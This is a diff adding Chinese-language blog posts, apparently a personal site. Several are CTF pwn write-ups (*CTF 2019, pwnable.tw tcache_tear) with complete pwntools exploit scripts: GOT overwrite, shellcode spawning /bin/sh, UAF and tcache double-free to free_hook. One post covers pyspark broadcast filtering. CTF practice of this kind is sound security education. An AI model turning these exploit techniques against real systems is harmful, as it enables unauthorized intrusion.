@@ -189,7 +189,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/spark/">spark</a></li></ul>
                     </div>
                 </section>
                 
@@ -267,6 +267,310 @@
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-CTF-2019-quicksort、babyshell、upxofcpp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/05/10/CTF-2019-quicksort、babyshell、upxofcpp/" class="article-date">
+      <time datetime="2019-05-10T06:24:28.000Z" itemprop="datePublished">2019-05-10</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/10/CTF-2019-quicksort、babyshell、upxofcpp/">*CTF 2019 quicksort、babyshell、upxofcpp</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>这次参加比赛总共出了三道，有两道队友都先交了，还是tcl，heap_master卡了差不多一天没解决。。。。还是记录一下出的题目吧</p>
+<p>##quicksort<br><img src="/2019/05/10/CTF-2019-quicksort、babyshell、upxofcpp/1.png" alt="ida"><br><img src="/2019/05/10/CTF-2019-quicksort、babyshell、upxofcpp/2.png" alt="ida"><br>题目大体流程就是输入要输入的数字数量，然后输入数字，经过一个快速排序输出，然后结束。<br>漏洞：</p>
+<p>gets函数这里存在栈溢出，可以覆盖i,j,ptr,num。</p>
+<p>利用思路：</p>
+<p>libc泄露：可以修改ptr指向gets_got，并将i和num设置为1,1。这样可以修改free_got的值同时下面会输出gets的地址来泄露libc</p>
+<p>步骤：</p>
+<p>1.修改free_got为0x8048816同时泄露libc地址</p>
+<p>2.修改free_got为system函数并在bss上面构造/bin/sh，把ptr设置为/bin/sh的地址</p>
+<p>3.调用free时getshell</p>
+<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./quicksort',env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)</span></span><br><span class="line">p = remote(<span class="string">'34.92.96.238'</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">free_got = <span class="number">0x804a018</span></span><br><span class="line">main_addr = <span class="number">0x8048816</span></span><br><span class="line">bss_addr = <span class="number">0x804a03c</span></span><br><span class="line">p.recvuntil(<span class="string">'sort?'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">payload=str(main_addr)+<span class="string">'a'</span>*<span class="number">0x7</span>+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0</span>)+p32(free_got<span class="number">-0x4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'result:'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">gets_addr = int(p.recvline().replace(<span class="string">'\n'</span>,<span class="string">''</span>))+<span class="number">2</span>**<span class="number">32</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"gets_addr:"</span>,hex(gets_addr)</span><br><span class="line">libc.address = gets_addr-libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc.address+<span class="number">0x3ac62</span></span><br><span class="line">bin_sh_addr = libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">p.recvuntil(<span class="string">'sort?'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">payload=str(system_addr<span class="number">-2</span>**<span class="number">32</span>).ljust(<span class="number">16</span>,<span class="string">'a'</span>)+p32(<span class="number">3</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0</span>)+p32(free_got<span class="number">-0x4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">payload=str(<span class="number">6845231</span>).ljust(<span class="number">16</span>,<span class="string">'a'</span>)+p32(<span class="number">2</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss_addr+<span class="number">0x4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">payload=str(<span class="number">1852400175</span>).ljust(<span class="number">16</span>,<span class="string">'a'</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'result:'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>babyshell</p>
+<p>这题由于偷懒第二天起太晚了。做完已经被提交了<br><img src="/2019/05/10/CTF-2019-quicksort、babyshell、upxofcpp/3.png" alt="ida"><br>输入shellcode然后会执行，要求是shellcode只能是一个数组里的值。</p>
+<p>这题syscall可以调用，rsi本身就是buf地址，所以只需要把rdi改成0，rdx改成length，就可以调用read写buf了，刚好可写的里面有pop rdi，pop rdx</p>
+<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#p = process('./shellcode')</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p = remote(<span class="string">'34.92.37.22'</span>,<span class="number">10002</span>)</span><br><span class="line">p.recvuntil(<span class="string">'plz:'</span>)</span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x0</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x73</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p.send(asm(payload,arch=<span class="string">'amd64'</span>))</span><br><span class="line">payload2 = <span class="string">'''</span></span><br><span class="line"><span class="string">    mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    mov rsi,0</span></span><br><span class="line"><span class="string">    mov rdx,0</span></span><br><span class="line"><span class="string">    mov rax,0x3b</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br><span class="line">p.send((<span class="string">'\x90'</span>*<span class="number">8</span>+asm(payload2,arch=<span class="string">'amd64'</span>)))</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#raw_input()</span></span><br></pre></td></tr></table></figure></p>
+<p>upxofcpp</p>
+<p>一个upx加壳后的程序，脱壳后分析：<br><img src="/2019/05/10/CTF-2019-quicksort、babyshell、upxofcpp/4.png" alt="ida"><br><img src="/2019/05/10/CTF-2019-quicksort、babyshell、upxofcpp/5.png" alt="ida"><br><img src="/2019/05/10/CTF-2019-quicksort、babyshell、upxofcpp/6.png" alt="ida"><br>free存在uaf漏洞，而且free和show函数都存在一个特定地址函数调用</p>
+<p>这题一直没想出来，直到队里大佬说加壳的程序中堆是rwx的。<br><img src="/2019/05/10/CTF-2019-quicksort、babyshell、upxofcpp/7.png" alt="ida"><br>所以这题就很简单了，步骤为：</p>
+<p>1.构造堆块让使用show函数的时候调用一个堆地址</p>
+<p>2.在该堆地址上面构造shellcode</p>
+<p>3.运行shellcode拿到shell</p>
+<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./upxofcpp')</span></span><br><span class="line">p = remote(<span class="string">'34.92.121.149'</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'stop:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">    mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    mov rsi,0</span></span><br><span class="line"><span class="string">    mov rdx,0</span></span><br><span class="line"><span class="string">    mov rax,0x3b</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> len(asm(payload,arch=<span class="string">'amd64'</span>))</span><br><span class="line">payload = asm(payload,arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#print len(payload)</span></span><br><span class="line">result =<span class="string">''</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">35</span>:</span><br><span class="line">    result+=str(struct.unpack(<span class="string">'&lt;i'</span>,payload[i:i+<span class="number">4</span>])[<span class="number">0</span>])+<span class="string">' '</span></span><br><span class="line">    i+=<span class="number">4</span></span><br><span class="line">result+=<span class="string">'-1'</span></span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x22</span>,<span class="string">'-1'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x12</span>,<span class="string">'1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 2095775979 -1'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x8</span>,<span class="string">'-1'</span>)</span><br><span class="line"><span class="comment">#add(1,0x8,'1 2 1156288656 -1')</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x50</span>,result)</span><br><span class="line"><span class="comment">#add(4,0x22,'-1')</span></span><br><span class="line"><span class="comment">#add(3,0x22,'-1')</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#delete(3)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-pwnable-tw-tcache-tear" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/05/10/pwnable-tw-tcache-tear/" class="article-date">
+      <time datetime="2019-05-10T06:19:35.000Z" itemprop="datePublished">2019-05-10</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/10/pwnable-tw-tcache-tear/">pwnable.tw tcache_tear</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>先看一下题目大体过程：<br><img src="/2019/05/10/pwnable-tw-tcache-tear/1.png" alt="ida"><br>首先可以输入Name保存在0x602060位置处，然后是一个堆操作目录：<br><img src="/2019/05/10/pwnable-tw-tcache-tear/2.png" alt="ida"><br>1是malloc一个小于0xff的chunk，把ptr指针指向chunk，并可以写数据，2是free ptr指针指向的chunk，3是打印0x602060的数据，4退出</p>
+<p>题目没有开aslr，free那里存在uaf漏洞，有tcache，思路是：</p>
+<p>1.让堆分配到0x602060去并修改0x602060的size(大于fastbin)</p>
+<p>2.在后面伪造堆(需要伪造下一个堆的size和下下个堆的size(pre_inuse=1))</p>
+<p>3.申请到0x602060去释放，就会把0x602060的位置改成main_arena+96</p>
+<p>4.info泄露出libc</p>
+<p>5.继续利用double free将堆分配到free_hook-0x8上修改为/bin/sh\x00和system即可getshell。</p>
+<p> 注意：这里发现只要fd有值，malloc就会分配同时tcache对应标志位-1，如果tcache标志位为0但是fd仍有值，下一个malloc后，tcache标志位会变为ff，那么你去free一个对应大小的堆的时候，会认为tcache中已经满了而正常释放到unsortedbin里。<br><img src="/2019/05/10/pwnable-tw-tcache-tear/3.png" alt="ida"><br>这是double free同一个堆然后申请了两次的tcache情况，<br><img src="/2019/05/10/pwnable-tw-tcache-tear/4.png" alt="ida"><br>这是再malloc一个堆后tcache的情况。</p>
+<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./tcache_tear'</span>)</span><br><span class="line"><span class="comment">#p = remote('chall.pwnable.tw',10207)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"Name:"</span>)</span><br><span class="line">p.sendline(<span class="string">'loeklvlh'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./tcache_tear.so'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line">    p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Name :'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">alloc(<span class="number">0x8f</span>,<span class="string">'hacked by loeklvlh'</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">alloc(<span class="number">0x8f</span>,p64(<span class="number">0x602050</span>))</span><br><span class="line">alloc(<span class="number">0x8f</span>,<span class="string">'hacked by loeklvlh'</span>)</span><br><span class="line">alloc(<span class="number">0x8f</span>,p64(<span class="number">0x6020a0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)*<span class="number">8</span>+p64(<span class="number">0x6020e0</span>))<span class="comment">#0x602050</span></span><br><span class="line">alloc(<span class="number">0x7f</span>,<span class="string">'loeklvlh'</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">alloc(<span class="number">0x7f</span>,p64(<span class="number">0x602050</span>))</span><br><span class="line">alloc(<span class="number">0x7f</span>,<span class="string">'loeklvlh'</span>)</span><br><span class="line">alloc(<span class="number">0x7f</span>,<span class="string">'loeklvlh'</span>+p64(<span class="number">0x91</span>)) <span class="comment">#0x602050</span></span><br><span class="line">alloc(<span class="number">0x7f</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0x602060</span>)+p64(<span class="number">0x21</span>)) <span class="comment">#0x6020a0</span></span><br><span class="line">alloc(<span class="number">0x7f</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>))<span class="comment">#0x6020e0</span></span><br><span class="line">alloc(<span class="number">0x7f</span>,<span class="string">'loeklvlh'</span>)<span class="comment">#0x602060</span></span><br><span class="line">delete()</span><br><span class="line">info()</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span><span class="number">-0x10</span>-libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc address:"</span>,hex(libc.address)</span><br><span class="line">malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = libc.address+<span class="number">0x4f2c5</span></span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">alloc(<span class="number">0x4f</span>,<span class="string">'loeklvlh'</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">alloc(<span class="number">0x4f</span>,p64(free_hook<span class="number">-0x8</span>))</span><br><span class="line">alloc(<span class="number">0x4f</span>,<span class="string">'loeklvlh'</span>)</span><br><span class="line">alloc(<span class="number">0x4f</span>,<span class="string">'/bin/sh\x00'</span>+p64(system))</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>这里改malloc_hook为one_gadget都不能用，而且试了用double free触发libc_message来调用malloc_hook也失败了这里没搞懂，所以还是改了free_hook。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-pyspark如何遍历broadcast" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/05/10/pyspark如何遍历broadcast/" class="article-date">
+      <time datetime="2019-05-10T06:17:01.000Z" itemprop="datePublished">2019-05-10</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/10/pyspark如何遍历broadcast/">pyspark如何遍历broadcast</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>因为论文关系要用到pyspark，具体情形如下：</p>
+<p>有一个list=[‘aaa’,’bbb’,’ccc’,’ddd’]，然后有一个rdd内数据类型是str，eg:’abcdefg’，正常如果是需要筛选数组包含的rdd数据可以定义一个broadcast，然后写成：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">broadcastvalue = sc.broadcast(list)</span><br><span class="line"></span><br><span class="line">rdd.filter(<span class="keyword">lambda</span> x:x <span class="keyword">in</span> broadcastvalue.value).collect()</span><br></pre></td></tr></table></figure></p>
+<p>我的需求是要筛选str中包含有list中任意一个数据的那些数据,eg:如果str =’aaaxxxxxx’，因为list[0]=’aaa’ in str，所以这个数据是我需要的，开始时尝试写成：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(data,list)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">broadcastvalue = sc.broadcast(list)</span><br><span class="line">rdd.filter(<span class="keyword">lambda</span> x:choice(x,broadcastvalue.value)).collect()</span><br></pre></td></tr></table></figure></p>
+<p>但是这样会报错broadcast is not iterable，这是说明broadcast是一个不可迭代的对象，搜索无果后想到了解决方案，竟然不可以迭代那么我就用非迭代的方式遍历就行了：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(data,list)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(list)):</span><br><span class="line">        <span class="keyword">if</span> list[i] <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">broadcastvalue = sc.broadcast(list)</span><br><span class="line">rdd.filter(<span class="keyword">lambda</span> x:choice(x,broadcastvalue.value)).collect()</span><br></pre></td></tr></table></figure></p>
+<p>其实修改很简单，只是不再用它作为一个迭代对象来遍历了。</p>
+<p>废话语录：</p>
+<p>在做这个的时候python3碰上了许多的UnicodeError问题，解决思路：</p>
+<p>1.肯定是编码问题</p>
+<p>2.读取数据库的先判断数据库的编码，表编码、字段编码，读取csv的先判断csv的编码</p>
+<p>3.再判断python的脚本编码</p>
+<p>4.再判断各个字符串的编码情况(str.encode(‘utf-8’))</p>
+<p>最后发现是在存csv的时候字段编码是ascii，然后用.encode(‘utf-8’)报了UnicodeError错误，最后找到了解决方法.encode(‘utf-8’,errors=’ignore’)</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/spark/">spark</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-pwn易忘操作原理笔记" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/05/10/pwn易忘操作原理笔记/" class="article-date">
+      <time datetime="2019-05-10T06:13:43.000Z" itemprop="datePublished">2019-05-10</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/10/pwn易忘操作原理笔记/">pwn易忘操作原理笔记</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>堆溢出漏洞：</p>
+<p>一、null-byte-off-by-one</p>
+<p>漏洞原理：由于输入操作失误，导致可以把size最低字节修改为\x00，overlapchunk利用。</p>
+<p>构造<br><img src="/2019/05/10/pwn易忘操作原理笔记/1.png" alt="ida"><br>1.freeB，此时C的presize被修改为B的大小</p>
+<p>2.通过A的null-byte-off-by-one漏洞修改B的size大小，malloc b1,b2两个块，此时由于通过B的size去找下一个堆块的presize位置来修改，B的size被改动后，C的presize无法得到更新仍然是B的原来大小。<br><img src="/2019/05/10/pwn易忘操作原理笔记/2.png" alt="ida"><br>3.free b1，free C，free C的时候通过presize找到b1的位置判断b1未使用所以发生unlink合并。</p>
+<p>4.申请一个大的chunk就可以覆盖到b2堆块。</p>
+<p>二、ret2dl-runtime-resolve</p>
